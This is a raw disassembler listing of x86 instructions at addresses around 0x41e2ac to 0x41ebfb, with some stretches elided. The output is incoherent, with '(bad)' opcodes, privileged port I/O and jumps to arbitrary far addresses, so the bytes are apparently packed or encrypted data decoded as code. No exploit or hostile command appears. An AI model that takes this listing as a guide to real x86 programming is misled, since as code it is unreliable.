  41e2ac:	stc    
  41e2ad:	stos   BYTE PTR es:[edi],al
  41e2ae:	pop    ds
  41e2af:	adc    BYTE PTR ds:0xd5e38c3d,bh
  41e2b5:	fidivr WORD PTR [edi+ebp*8+0x46b038f3]
  41e2bc:	sub    DWORD PTR [esi],eax
  41e2be:	cmc    
  41e2bf:	dec    esi
  41e2c0:	lods   eax,DWORD PTR ds:[esi]
  41e2c1:	lds    ebp,FWORD PTR [ecx]
  41e2c3:	pushf  
  41e2c4:	jmp    0x7c24:0x9899752e
  41e2cb:	fisttp WORD PTR [edx-0x49]
  41e2ce:	rcr    DWORD PTR [edx+0x56],cl
  41e2d1:	(bad)  
  41e2d2:	stos   BYTE PTR es:[edi],al
  41e2d3:	pop    edi
  41e2d4:	push   edx
  41e2d5:	xor    DWORD PTR [edi-0x29],ebp
  41e2d8:	ds pusha 
  41e2da:	inc    edi
  41e2db:	jmp    0x41e2c6
  41e2dd:	pop    edx
  41e2de:	mov    dh,0x39
  41e2e0:	cmp    esi,DWORD PTR [edi-0x54]
  41e2e3:	lods   al,BYTE PTR ds:[esi]
  41e2e4:	cmovge ebp,DWORD PTR fs:[edi+0x4c]
  41e2e9:	loop   0x41e309
  41e2eb:	mov    edi,0x986ec317
  41e2f0:	jnp    0x41e2fe
  41e2f2:	sbb    BYTE PTR [edx-0x46],bh
  41e2f5:	jo     0x41e2a2
  41e2f7:	mov    edi,0xa0ec3552
  41e2fc:	jl     0x41e364
  41e2fe:	into   
  41e2ff:	xor    cl,bh
  41e301:	sbb    edx,DWORD PTR [ecx+0x20]
  41e304:	int3   
  41e305:	shl    BYTE PTR ds:0x8ecd7818,1
  41e30b:	(bad)  
  41e30c:	and    eax,0xd5e7f6db
  41e311:	stos   BYTE PTR es:[edi],al
  41e312:	dec    ecx
  41e313:	fdivr  QWORD PTR [edi+0x279a2eb7]
  41e319:	shr    DWORD PTR [esi+esi*1-0x4f6be10],1
  41e320:	jmp    0x41e348
  41e322:	lock mov al,0x46
  41e325:	pushf  
  41e326:	or     al,0x91
  41e328:	adc    DWORD PTR [ebx-0x4a],ebp
  41e32b:	pop    edi
  41e32c:	call   FWORD PTR [edi-0x3e]
  41e32f:	mov    cl,0x3
  41e331:	push   ebp
  41e332:	jl     0x41e33a
  41e334:	fild   DWORD PTR [eax]
	...
  41e396:	mov    DWORD PTR [edx],edx
  41e398:	ja     0x41e3b9
  41e39a:	(bad)  
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0x9e204855
  41e3a3:	sbb    ecx,DWORD PTR [ecx+0x13fef04]
  41e3a9:	add    BYTE PTR [edi],al
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    ah,bh
  41e3af:	mov    fs,WORD PTR [esi+ecx*8-0x74]
  41e3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3b4:	push   cs
  41e3b5:	mov    edi,esp
  41e3b7:	mov    ah,0x34
  41e3b9:	es mov ebx,0x6e8f87ab
  41e3bf:	mov    bh,0xc3
  41e3c1:	mov    esp,0x74b3ea69
  41e3c6:	pop    edi
  41e3c7:	xor    DWORD PTR [edi+edx*2],0x8cda7985
  41e3ce:	sbb    al,0x16
  41e3d0:	repz ret 
  41e3d2:	call   0x5ac5f9a0
  41e3d7:	(bad)  
  41e3d8:	test   DWORD PTR [edi-0x58],edx
  41e3db:	fstp   DWORD PTR [edx+0x21]
  41e3de:	mov    ecx,0x2d38273c
  41e3e3:	add    ebx,DWORD PTR [edi]
  41e3e5:	xlat   BYTE PTR ds:[ebx]
  41e3e6:	mov    bh,0x8c
  41e3e8:	xchg   edi,eax
  41e3e9:	xchg   esp,eax
  41e3ea:	aam    0xf9
  41e3ec:	cdq    
  41e3ed:	pushf  
  41e3ee:	imul   eax,DWORD PTR [eax-0x32e784f8],0x92331b85
  41e3f8:	mov    bl,0xd3
  41e3fa:	(bad)  
  41e3fb:	jmp    0x4d187eef
  41e400:	popf   
  41e401:	test   al,0x6f
  41e403:	adc    eax,0x91e279fb
  41e408:	xchg   ebx,eax
  41e409:	sub    al,0x97
  41e40b:	sbb    bl,BYTE PTR [ebx-0xd]
  41e40e:	or     ah,BYTE PTR [esi+0x544dd8fd]
  41e414:	xchg   esp,eax
  41e415:	xor    DWORD PTR [ebp-0xf],esp
  41e418:	xor    DWORD PTR [edx+0x10],edx
  41e41b:	and    eax,0x92706e6c
  41e420:	and    BYTE PTR [ebp-0x5e],cl
  41e423:	sub    al,0xb1
  41e425:	add    DWORD PTR [esi+0x6318f8cf],ebx
  41e42b:	bound  edi,QWORD PTR [eax+eax*8]
  41e42e:	cmp    esp,ecx
  41e430:	xchg   edi,eax
  41e431:	sti    
  41e432:	std    
  41e433:	(bad)
  41e436:	(bad)  
  41e437:	jnp    0x41e3d4
  41e439:	mov    bh,BYTE PTR [esi]
  41e43b:	hlt    
  41e43c:	retf   
  41e43d:	inc    ebx
  41e43e:	mov    dl,0xf3
  41e440:	push   0x2f9ea548
  41e445:	xchg   esp,eax
  41e446:	dec    esp
  41e447:	and    ah,BYTE PTR [eax+0x59]
  41e44a:	addr16 aam 0xb3
  41e44d:	sub    eax,0xc397a78b
  41e452:	sbb    dl,ch
  41e454:	sbb    al,0xf5
  41e456:	xchg   ebx,eax
  41e457:	mov    ah,0x98
  41e459:	dec    esi
  41e45a:	leave  
  41e45b:	push   edi
  41e45c:	mov    ah,0x32
  41e45e:	inc    ebp
  41e45f:	fdivr  DWORD PTR ds:0xdf595ad2
  41e465:	mov    ds:0x8d947c50,eax
  41e46a:	outs   dx,BYTE PTR ds:[esi]
  41e46b:	fldenv [ecx+0x1a]
  41e46e:	fstp   TBYTE PTR [esi+ebp*2]
  41e471:	sub    edi,0xffffffea
  41e474:	popa   
  41e475:	fcom   QWORD PTR [esi+ebp*1]
  41e478:	and    DWORD PTR [ebp+0x121ffb71],edi
  41e47e:	out    dx,eax
  41e47f:	mov    al,ds:0x9beafd23
  41e484:	repnz mov esi,ds
  41e487:	push   cs
  41e488:	pusha  
  41e489:	popa   
  41e48a:	lds    ebx,FWORD PTR [ecx+0x20]
  41e48d:	or     BYTE PTR [ebp+0x7039e441],bl
  41e493:	jge    0x41e43f
  41e495:	inc    esi
  41e496:	jp     0x41e43b
  41e498:	les    ebp,FWORD PTR [edi+0x60b7742d]
  41e49e:	clc    
  41e49f:	fnstsw WORD PTR [esi+0x52]
  41e4a2:	sbb    DWORD PTR ds:0x67c9b36,esp
  41e4a8:	add    al,0x76
  41e4aa:	add    eax,0x65827e42
  41e4af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4b0:	retf   0x5516
  41e4b3:	call   0x0:0x3f
	...
  41e516:	and    BYTE PTR [edx-0x35],ch
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	out    dx,al
  41e523:	mov    eax,0x40f6f60c
  41e528:	add    DWORD PTR [eax],eax
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    BYTE PTR [edx-0x76],cl
  41e530:	es sub al,0x6d
  41e533:	push   eax
  41e534:	iret   
  41e535:	ficom  DWORD PTR [ebx]
  41e537:	lahf   
  41e538:	sub    esp,DWORD PTR [edx-0x3a76db86]
  41e53e:	aaa    
  41e53f:	cli    
  41e540:	data16 mov ds:0x2a104dbd,al
  41e546:	jl     0x41e5ae
  41e548:	push   edx
  41e549:	test   BYTE PTR [edi-0x2e],ah
  41e54c:	mov    ecx,0xced080a6
  41e551:	mov    eax,0x6759e6a3
  41e556:	imul   edi,DWORD PTR [esp+ecx*8-0x3e200e88],0x4e
  41e55e:	mov    bh,0xce
  41e560:	pop    ss
  41e561:	bound  ebx,QWORD PTR [edi]
  41e563:	xchg   ebx,eax
  41e564:	adc    al,0xe9
  41e566:	mov    eax,ecx
  41e568:	jb     0x41e597
  41e56a:	cmp    BYTE PTR [ecx+0x75],dl
  41e56d:	adc    ecx,DWORD PTR ds:0x2e63d5cf
  41e573:	jno    0x41e5c2
  41e575:	dec    ecx
  41e576:	ret    0x8646
  41e579:	jae    0x41e597
  41e57b:	or     DWORD PTR [eax],ebx
  41e57d:	cmp    al,0x8a
  41e57f:	loop   0x41e54a
  41e581:	or     DWORD PTR [edi+edi*2-0x2d],esp
  41e585:	dec    ebp
  41e586:	test   dl,bh
  41e588:	sbb    BYTE PTR [ebx+0x7a],bl
  41e58b:	or     eax,0xbe3fdd45
  41e590:	(bad)  
  41e591:	lds    eax,FWORD PTR ds:0xf0fc29b6
  41e597:	aam    0x61
  41e599:	scas   eax,DWORD PTR es:[edi]
  41e59a:	sbb    eax,0x7f4bbb9d
  41e59f:	jmp    0xf790d6f6
  41e5a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a5:	add    DWORD PTR ds:[edx+0x19],ecx
  41e5a9:	and    cl,dh
  41e5ab:	mov    WORD PTR [edx+0x6d],fs
  41e5ae:	js     0x41e585
  41e5b0:	pop    edx
  41e5b1:	in     eax,0x9f
  41e5b3:	pop    esp
  41e5b4:	push   esp
  41e5b5:	jns    0x41e585
  41e5b7:	das    
  41e5b8:	das    
  41e5b9:	push   esp
  41e5ba:	call   0x808a:0xbad9e8f7
  41e5c1:	sbb    DWORD PTR [edi],0xffffffef
  41e5c4:	inc    edx
  41e5c5:	ss dec esp
  41e5c7:	or     DWORD PTR [ebp+0x7c],ecx
  41e5ca:	das    
  41e5cb:	mov    bl,BYTE PTR [edx+0xc]
  41e5ce:	push   eax
  41e5cf:	adc    ebp,0x864279b0
  41e5d5:	add    edi,DWORD PTR [ebx]
  41e5d7:	shl    cl,0x0
  41e5da:	pop    es
  41e5db:	sub    DWORD PTR [ebx],esi
  41e5dd:	mov    esp,0x4be1e031
  41e5e2:	stos   DWORD PTR es:[edi],eax
  41e5e3:	dec    ecx
  41e5e4:	call   0x8cd694e8
  41e5e9:	add    dh,dh
  41e5eb:	stc    
  41e5ec:	lods   eax,DWORD PTR ds:[esi]
  41e5ed:	add    al,0xb8
  41e5ef:	cld    
  41e5f0:	dec    esp
  41e5f1:	fisttp DWORD PTR [ebp+0x4fc0d5c4]
  41e5f7:	sub    eax,0x1100e352
  41e5fc:	aas    
  41e5fd:	leave  
  41e5fe:	repz sub al,0x37
  41e601:	bnd jae 0x41e609
  41e604:	div    BYTE PTR [ecx*4+0x3d7cc014]
  41e60b:	pop    ecx
  41e60c:	push   0xffffffb5
  41e60e:	or     al,0x11
  41e610:	hlt    
  41e611:	push   ebp
  41e612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e613:	or     ah,BYTE PTR [ebp+0x69]
  41e616:	pop    eax
  41e617:	(bad)  
  41e618:	mov    WORD PTR [ebp+0x2df4c6f1],cs
  41e61e:	push   0xffffff97
  41e620:	push   esi
  41e621:	popa   
  41e622:	cmc    
  41e623:	nop
  41e624:	sbb    DWORD PTR [edx+eiz*1],edi
  41e627:	dec    esi
  41e628:	lock jecxz 0x41e62f
  41e62b:	lock push edi
  41e62d:	and    DWORD PTR [edx],esp
  41e62f:	cs pop edi
  41e631:	dec    ebx
  41e632:	gs inc esi
  41e634:	add    BYTE PTR [bx+si],al
	...
  41e693:	add    BYTE PTR [eax],al
  41e695:	add    ch,al
  41e697:	cwde   
  41e698:	loope  0x41e6ef
  41e69a:	std    
  41e69b:	jge    0x41e692
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0x1d17f6e3,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    BYTE PTR [esi+0x1c],dl
  41e6b0:	sub    ebx,ebx
  41e6b2:	imul   ecx,DWORD PTR [edi],0x18d2606e
  41e6b8:	mov    ebp,0xbf5945d
  41e6bd:	cld    
  41e6be:	xchg   esp,eax
  41e6bf:	hlt    
  41e6c0:	nop
  41e6c1:	fdiv   DWORD PTR [esi+0x7098f229]
  41e6c7:	adc    al,0xb7
  41e6c9:	in     eax,dx
  41e6ca:	(bad)  
  41e6cb:	mov    edi,0xe5be36a6
  41e6d0:	fcom   DWORD PTR [edx]
  41e6d2:	jno    0x41e6f1
  41e6d4:	lds    esp,FWORD PTR [eax-0x8]
  41e6d7:	mov    cl,0x95
  41e6d9:	(bad)  
  41e6da:	cld    
  41e6db:	cmp    eax,0x4b159a2
  41e6e0:	mov    esp,0x39e715b7
  41e6e5:	dec    ebx
  41e6e6:	jge    0x41e6fb
  41e6e8:	and    BYTE PTR [eax+0x0],dl
  41e6eb:	sub    eax,DWORD PTR [edx+0x1a]
  41e6ee:	jo     0x41e734
  41e6f0:	jne    0x41e71d
  41e6f2:	sbb    al,0x7e
  41e6f4:	fisubr DWORD PTR [ecx]
  41e6f6:	sub    edi,ebx
  41e6f8:	cmp    al,BYTE PTR [ebp+0x7d459edb]
  41e6fe:	cmp    BYTE PTR [esi],ch
  41e700:	mov    cs,ecx
  41e702:	push   es
  41e703:	in     eax,dx
  41e704:	mov    eax,ds:0xd3d019c8
  41e709:	iret   
  41e70a:	xchg   eax,ebx
  41e70c:	dec    ebp
  41e70d:	or     eax,0xa9861353
  41e712:	shl    ebx,cl
  41e714:	and    ebx,DWORD PTR [edx-0x13029b2]
  41e71a:	dec    ecx
  41e71b:	sti    
  41e71c:	dec    BYTE PTR [edi]
  41e71e:	or     esp,DWORD PTR [ebx]
  41e720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e721:	xchg   esi,eax
  41e722:	mov    ds:0xf04ea2dc,al
  41e727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e728:	xchg   esi,eax
  41e729:	outs   dx,BYTE PTR ds:[esi]
  41e72a:	sub    edx,DWORD PTR es:[esi+ecx*8]
  41e72e:	xchg   esi,eax
  41e72f:	mov    ch,0xa6
  41e731:	add    eax,0x8439920a
  41e736:	idiv   DWORD PTR [ebx+esi*2+0x8]
  41e73a:	mov    al,0xa6
  41e73c:	(bad)  
  41e73d:	pop    esp
  41e73e:	pop    es
  41e73f:	mov    ds:0xff2ca7a4,eax
  41e744:	and    al,0x79
  41e746:	mov    ah,0x30
  41e748:	rcl    BYTE PTR [edx],0x2c
  41e74b:	out    dx,eax
  41e74c:	mov    bh,0x7a
  41e74e:	sub    dh,BYTE PTR [ecx+esi*8]
  41e751:	fimul  WORD PTR [ebp-0x3]
  41e754:	fnstsw WORD PTR [edx]
  41e756:	jecxz  0x41e773
  41e758:	push   edx
  41e759:	sbb    eax,eax
  41e75b:	out    0x76,al
  41e75d:	cmp    al,0xc0
  41e75f:	push   0x3a
  41e761:	mov    edx,0x99146c56
  41e766:	nop
  41e767:	push   ebp
  41e768:	xor    BYTE PTR [ebx],al
  41e76a:	push   edx
  41e76b:	loopne 0x41e7cf
  41e76d:	idiv   DWORD PTR [esi-0x56]
  41e770:	mov    ss,WORD PTR [edi]
  41e772:	dec    ebp
  41e773:	cmp    esi,DWORD PTR ds:0xcc2fdc65
  41e779:	adc    al,0xdb
  41e77b:	inc    esi
  41e77c:	mov    al,0x82
  41e77e:	push   cs
  41e77f:	jns    0x41e73a
  41e781:	pop    esi
  41e782:	xrelease xchg WORD PTR [ebx+0x0],bp
  41e787:	xchg   ebx,eax
  41e788:	and    dh,BYTE PTR [esi+0x3a11ba97]
  41e78e:	sub    ebp,edi
  41e790:	in     eax,dx
  41e791:	fistp  QWORD PTR [ebx]
  41e793:	xchg   edx,eax
  41e794:	sub    DWORD PTR [esi+0x4d],ecx
  41e797:	enter  0x1a0a,0x84
  41e79b:	inc    edx
  41e79c:	imul   ebx,DWORD PTR [edi],0xffffffe4
  41e79f:	and    ebx,ebp
  41e7a1:	and    ecx,DWORD PTR [eax]
  41e7a3:	in     al,dx
  41e7a4:	jno    0x41e726
  41e7a6:	push   es
  41e7a7:	xchg   ecx,eax
  41e7a8:	pop    edx
  41e7a9:	aam    0x60
  41e7ab:	xlat   BYTE PTR ds:[ebx]
  41e7ac:	sub    edx,DWORD PTR [ebx*8+0x1d403e60]
  41e7b3:	sub    al,0x1d
	...
  41e815:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0xffffff82
  41e823:	push   ecx
  41e824:	xor    ah,cl
  41e826:	add    al,0x43
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    BYTE PTR [edx-0x23],dl
  41e830:	push   ecx
  41e831:	adc    ah,ch
  41e833:	jge    0x41e7f7
  41e835:	sahf   
  41e836:	push   ebp
  41e837:	jge    0x41e85e
  41e839:	fsubr  DWORD PTR [ebx]
  41e83b:	and    cl,BYTE PTR [edi+eiz*2]
  41e83e:	jg     0x41e88a
  41e840:	sbb    BYTE PTR [eax],cl
  41e842:	cmp    BYTE PTR [edx+0x40448ec5],al
  41e848:	shl    DWORD PTR [esi-0x78],0x18
  41e84c:	iret   
  41e84d:	dec    ecx
  41e84e:	iret   
  41e84f:	(bad)  
  41e850:	(bad)  [edi+0x294f407d]
  41e856:	pop    esi
  41e857:	xchg   edx,eax
  41e858:	mov    ebp,0xd491dc35
  41e85d:	mov    edi,0x1e38d681
  41e862:	push   ebx
  41e863:	pop    ebx
  41e864:	pop    es
  41e865:	or     bh,BYTE PTR [ebx]
  41e867:	push   0xb0e3ab40
  41e86c:	fimul  DWORD PTR [ebx+eax*8]
  41e86f:	and    al,0xe4
  41e871:	shr    BYTE PTR [ecx],cl
  41e873:	jmp    0xceb7e8e6
  41e878:	mov    ds:0x205b028b,eax
  41e87d:	cwde   
  41e87e:	lods   al,BYTE PTR ds:[esi]
  41e87f:	xchg   ebp,eax
  41e880:	add    al,BYTE PTR [esi-0x5a3576d]
  41e886:	jno    0x41e879
  41e888:	stos   BYTE PTR es:[edi],al
  41e889:	add    BYTE PTR [edi],cl
  41e88b:	sbb    DWORD PTR [ecx-0x26e7b97e],eax
  41e891:	pop    esp
  41e892:	ins    DWORD PTR es:[edi],dx
  41e893:	pop    ss
  41e894:	mov    esi,0xa7fe3489
  41e899:	xor    BYTE PTR [esi+0x2e9401a],bh
  41e89f:	retf   0x511a
  41e8a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8a3:	lods   eax,DWORD PTR ds:[esi]
  41e8a4:	cs dec ecx
  41e8a6:	aam    0x72
  41e8a8:	inc    ebp
  41e8a9:	out    dx,al
  41e8aa:	xor    DWORD PTR [edx+ebx*4],edi
  41e8ad:	lahf   
  41e8ae:	popf   
  41e8af:	jg     0x41e8f4
  41e8b1:	jg     0x41e86b
  41e8b3:	call   0xa49e9b01
  41e8b8:	ins    DWORD PTR es:[edi],dx
  41e8b9:	icebp  
  41e8ba:	add    dl,BYTE PTR [ebx+0x77]
  41e8bd:	repz sbb dl,BYTE PTR [edi-0x78]
  41e8c1:	or     DWORD PTR [ecx+0x70b83e1b],0xffffff9a
  41e8c8:	daa    
  41e8c9:	push   esi
  41e8ca:	sbb    BYTE PTR [edi+edi*8-0x73],dl
  41e8ce:	lds    edi,FWORD PTR [edi+0x4ad0f645]
  41e8d4:	rol    DWORD PTR [esi+0x3f],cl
  41e8d7:	cmp    DWORD PTR [ebx],0xaf29246d
  41e8dd:	les    edi,FWORD PTR [eax+0x7d]
  41e8e0:	nop
  41e8e1:	dec    eax
  41e8e2:	aad    0xa7
  41e8e4:	or     cl,BYTE PTR [eax+0x72a68973]
  41e8ea:	and    DWORD PTR [edx+0x4e5c98c4],0xffffff9b
  41e8f1:	mov    ebx,DWORD PTR [edx]
  41e8f3:	hlt    
  41e8f4:	or     ebp,edi
  41e8f6:	into   
  41e8f7:	leave  
  41e8f8:	ss fcmove st,st(7)
  41e8fb:	xchg   esp,eax
  41e8fc:	xor    DWORD PTR [edi-0x41],esi
  41e8ff:	shl    DWORD PTR [edx],0x47
  41e902:	adc    al,0xa9
  41e904:	mov    dh,ch
  41e906:	pop    edx
  41e907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e908:	add    eax,0xe6eb5791
  41e90d:	loop   0x41e8e6
  41e90f:	jmp    0x98b4:0x5edc5705
  41e916:	fisttp WORD PTR [edx+0x36a9bb7e]
  41e91c:	xchg   edx,eax
  41e91d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e91e:	cmp    BYTE PTR [edx],cl
  41e920:	out    dx,eax
  41e921:	and    al,0x8
  41e923:	fild   QWORD PTR [eax+esi*2+0x52]
  41e927:	add    BYTE PTR ds:0xd405b95a,dl
  41e92d:	or     ebx,DWORD PTR [esi]
  41e92f:	ror    BYTE PTR [eax],cl
  41e931:	out    0x4d,eax
  41e933:	dec    ebp
  41e934:	push   ds
	...
  41e995:	add    BYTE PTR [eax-0x3],bh
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	leave  
  41e9a3:	or     ch,bl
  41e9a5:	adc    ecx,DWORD PTR [ebx]
  41e9a7:	inc    esp
  41e9a8:	add    DWORD PTR [eax],eax
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [eax],bl
  41e9af:	xchg   edx,eax
  41e9b0:	pop    ds
  41e9b1:	push   ds
  41e9b2:	loop   0x41e988
  41e9b4:	mov    dh,0xf7
  41e9b6:	jl     0x41ea0e
  41e9b8:	xor    al,0x52
  41e9ba:	mov    gs,WORD PTR [esi+0x60]
  41e9bd:	dec    edx
  41e9be:	stos   DWORD PTR es:[edi],eax
  41e9bf:	mov    al,0x46
  41e9c1:	push   esi
  41e9c2:	and    DWORD PTR [edi-0x49],esi
  41e9c5:	mov    DWORD PTR [edx-0x76],esp
  41e9c8:	hlt    
  41e9c9:	lods   al,BYTE PTR ds:[esi]
  41e9ca:	jmp    0xaa30f3d
  41e9cf:	dec    ecx
  41e9d0:	xchg   BYTE PTR [ebx+0x1],al
  41e9d3:	xchg   ebp,eax
  41e9d4:	inc    edx
  41e9d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9d6:	pop    ebx
  41e9d7:	rcl    al,cl
  41e9d9:	dec    ecx
  41e9da:	dec    BYTE PTR [ecx+0x46]
  41e9dd:	xor    al,0x3d
  41e9df:	mov    ah,0xca
  41e9e1:	ds aaa 
  41e9e3:	or     DWORD PTR [esi],0x2f99aa33
  41e9e9:	sub    al,0x47
  41e9eb:	int3   
  41e9ec:	fsub   DWORD PTR [ecx]
  41e9ee:	clc    
  41e9ef:	jno    0x41ea51
  41e9f1:	ret    
  41e9f2:	jno    0x41e9e4
  41e9f4:	fdivr  QWORD PTR [edi+0x62]
  41e9f7:	cmc    
  41e9f8:	(bad)  
  41e9f9:	jecxz  0x41ea38
  41e9fb:	adc    eax,0xd3f0c363
  41ea00:	mov    ch,0x8c
  41ea02:	xor    al,0x98
  41ea04:	and    al,0x59
  41ea06:	mov    ebx,0x1709790d
  41ea0b:	mov    DWORD PTR [ebx-0x79],esp
  41ea0e:	rcl    DWORD PTR cs:[edi-0x2a],1
  41ea12:	out    dx,al
  41ea13:	dec    esp
  41ea14:	sub    DWORD PTR [esi+0x57],edi
  41ea17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea18:	pop    esi
  41ea19:	dec    ecx
  41ea1a:	pushf  
  41ea1b:	mov    ebp,0xc4e2945f
  41ea20:	fcmovu st,st(0)
  41ea22:	push   es
  41ea23:	cmp    DWORD PTR [ebx+0x1577bfeb],0x3124f918
  41ea2d:	lock pop esp
  41ea2f:	sti    
  41ea30:	fidiv  WORD PTR [esi+0x15dff237]
  41ea36:	and    BYTE PTR [ebx],0x10
  41ea39:	pop    es
  41ea3a:	ret    
  41ea3b:	cmp    bh,BYTE PTR [ebx+0x2d]
  41ea3e:	adc    eax,0xdec0fa43
  41ea43:	repz bswap ebx
  41ea46:	int3   
  41ea47:	add    DWORD PTR [eax+0x38],ecx
  41ea4a:	outs   dx,BYTE PTR ds:[si]
  41ea4c:	in     al,0x86
  41ea4e:	call   0x3a4740b5
  41ea53:	push   ecx
  41ea54:	pop    ds
  41ea55:	(bad)  
  41ea56:	es xor ah,bl
  41ea59:	pop    eax
  41ea5a:	add    DWORD PTR [edx-0x6],eax
  41ea5d:	mov    ecx,0xe82a5156
  41ea62:	mov    eax,ds:0xcfb09dd9
  41ea67:	mov    bl,0x45
  41ea69:	(bad)  
  41ea6a:	sub    al,0x7c
  41ea6c:	out    0x12,al
  41ea6e:	push   ebp
  41ea6f:	test   ah,0x24
  41ea72:	xchg   ebp,eax
  41ea73:	mov    ebp,DWORD PTR [edi-0x1d]
  41ea76:	mov    esi,0xcb436dfe
  41ea7b:	xor    bh,dl
  41ea7d:	inc    edi
  41ea7e:	pop    ss
  41ea7f:	dec    eax
  41ea80:	mov    dh,0xab
  41ea82:	clc    
  41ea83:	inc    ebx
  41ea84:	sbb    DWORD PTR [edx+0x3f69d068],esi
  41ea8a:	lds    edx,FWORD PTR [ecx]
  41ea8c:	jp     0x41ea1c
  41ea8e:	les    ebx,FWORD PTR [ecx-0x5cf7820]
  41ea94:	mov    eax,ds:0x374a78f2
  41ea99:	inc    esp
  41ea9a:	dec    edx
  41ea9b:	or     BYTE PTR [edi+0x3dfd5b08],dl
  41eaa1:	add    eax,0x3bb04662
  41eaa6:	push   esp
  41eaa7:	push   0x4d3de77d
  41eaac:	ret    0x2fae
  41eaaf:	mov    al,0x51
  41eab1:	jmp    0x5e7f78
	...
  41eb16:	adc    ch,BYTE PTR [edi]
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fld    st(3)
  41eb23:	pop    ebx
  41eb24:	push   esp
  41eb25:	adc    al,BYTE PTR [di+0x1]
  41eb29:	add    BYTE PTR [edi],al
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    BYTE PTR [edx],ch
  41eb2f:	or     DWORD PTR [ecx+0x17fd120f],ebx
  41eb35:	cwde   
  41eb36:	pop    edi
  41eb37:	or     DWORD PTR [esi+ebx*1],esi
  41eb3a:	aad    0x84
  41eb3c:	ret    0x5a77
  41eb3f:	out    dx,eax
  41eb40:	jp     0x41eb79
  41eb42:	jnp    0x41eb51
  41eb44:	mov    al,ds:0xddc65d57
  41eb49:	or     DWORD PTR [edx+0x42],0x695d5803
  41eb50:	(bad)  
  41eb51:	dec    ebp
  41eb52:	xchg   ebx,eax
  41eb53:	dec    eax
  41eb54:	pop    ss
  41eb55:	jns    0x41eaed
  41eb57:	inc    ebx
  41eb58:	inc    ecx
  41eb59:	fs pusha 
  41eb5b:	jg     0x41eb23
  41eb5d:	mov    WORD PTR [ebx+0x6],ss
  41eb60:	scas   eax,DWORD PTR es:[edi]
  41eb61:	ror    DWORD PTR [edx+0x4c],cl
  41eb64:	push   cs
  41eb65:	cdq    
  41eb66:	cmp    ch,bl
  41eb68:	out    dx,al
  41eb69:	(bad)  
  41eb6a:	mov    edi,0x76ef52ba
  41eb6f:	xor    eax,0xaaa434ef
  41eb75:	iret   
  41eb76:	lds    esp,FWORD PTR [eax-0x30]
  41eb79:	add    bh,BYTE PTR [edx+0x38]
  41eb7c:	dec    BYTE PTR [edi]
  41eb7e:	add    eax,0xed42adbc
  41eb83:	dec    edx
  41eb84:	or     DWORD PTR [edi+0x1d76d4a3],ebp
  41eb8a:	adc    DWORD PTR [ebx],ebx
  41eb8c:	xchg   ebx,eax
  41eb8d:	push   ecx
  41eb8e:	inc    ebx
  41eb8f:	cmp    ecx,ebx
  41eb91:	add    al,0x61
  41eb94:	mov    al,ds:0x6c68d9cd
  41eb99:	ss enter 0xc55c,0x9e
  41eb9e:	adc    eax,0x9260b3b7
  41eba3:	inc    edi
  41eba4:	cld    
  41eba5:	mov    ds:0xdc0e6ddb,eax
  41ebaa:	(bad)  
  41ebab:	sub    al,0x3c
  41ebad:	repz xor DWORD PTR [esp+edx*2+0x2e69cb19],esi
  41ebb5:	fisttp QWORD PTR [edx-0x9160eed]
  41ebbb:	pop    eax
  41ebbc:	sub    eax,0x2554939
  41ebc1:	jl     0x41ec26
  41ebc3:	jbe    0x41ebc9
  41ebc5:	push   ebx
  41ebc6:	fdiv   st(7),st
  41ebc8:	stos   DWORD PTR es:[edi],eax
  41ebc9:	mov    dh,0xb4
  41ebcb:	add    ebx,DWORD PTR [esi-0x15]
  41ebce:	pop    es
  41ebcf:	stos   BYTE PTR es:[edi],al
  41ebd0:	call   0x1b7eaf52
  41ebd5:	jecxz  0x41eb76
  41ebd7:	mov    al,BYTE PTR [ecx-0x3a]
  41ebda:	push   esi
  41ebdb:	xor    DWORD PTR [eax-0x7c],eax
  41ebde:	mov    WORD PTR [ebx],fs
  41ebe0:	out    dx,al
  41ebe1:	fsub   DWORD PTR [ecx-0x4c]
  41ebe4:	lods   al,BYTE PTR ds:[esi]
  41ebe5:	jae    0x41ec5d
  41ebe7:	aam    0x50
  41ebe9:	push   esp
  41ebea:	ins    BYTE PTR es:[edi],dx
  41ebeb:	jb     0x41eb84
  41ebed:	xchg   BYTE PTR [edi+0x58],dl
  41ebf0:	jmp    0x32970e4c
  41ebf5:	and    eax,0x5501dfbd
  41ebfa:	xchg   esp,eax
  41ebfb:	mov    BYTE PTR [edx],al
